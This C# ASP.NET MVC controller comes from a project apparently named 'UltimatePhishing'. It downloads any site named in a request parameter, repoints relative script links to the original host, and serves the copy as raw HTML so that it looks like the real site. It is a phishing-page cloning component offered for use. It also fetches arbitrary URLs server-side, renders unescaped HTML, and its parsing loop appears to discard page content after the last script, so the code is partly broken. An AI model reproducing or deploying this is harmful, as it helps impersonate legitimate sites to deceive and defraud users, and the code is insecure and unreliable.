using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Web;
using System.Web.Mvc;
using UltimatePhishing.Models;

namespace UltimatePhishing.Controllers
{
    public class HomeController : Controller
    {
        private static string URLContent { get; set; }

        public ActionResult Index()
        {
            var model = new PhishModel();

            if (URLContent != null)
            {
                model.SiteContent = new HtmlString(URLContent);
            }
            else
            {
                model.SiteContent = new HtmlString("");
            }

            return View(model);
        }

        public ActionResult Mimic(string url)
        {
            using (var client = new WebClient())
            {
                URLContent = ParseHTML(client.DownloadString(url), url);
            }


            return RedirectToAction("Index");
        }

        public string ParseHTML(string content, string url)
        {
            bool done = false;
            List<string> finalHTML = new List<string>();
            while (!done)
            {
                var cutString = content.IndexOf("<script");
                cutString = cutString == -1 ? 0 : cutString;
                var endString = content.IndexOf("</script>");
                endString = endString == -1 ? 0 : endString + 9;

                if (cutString != endString)
                {
                    if (cutString != 0)
                    {
                        finalHTML.Add(content.Substring(0, cutString));
                        content = content.Substring(cutString, content.Length - cutString);
                    }
                    else
                    {
                        var scriptText = content.Substring(0, endString);

                        if (scriptText.Contains("src=\"") && !scriptText.Contains("www"))
                        {
                            scriptText = scriptText.Replace("src=\"", "src=\"" + url + "/");
                        }

                        finalHTML.Add(scriptText);
                        content = content.Substring(endString, content.Length - endString);
                    }
                }
                else
                {
                    done = true;
                }
            }
            
            
            return String.Join("", finalHTML);
        }
    }
}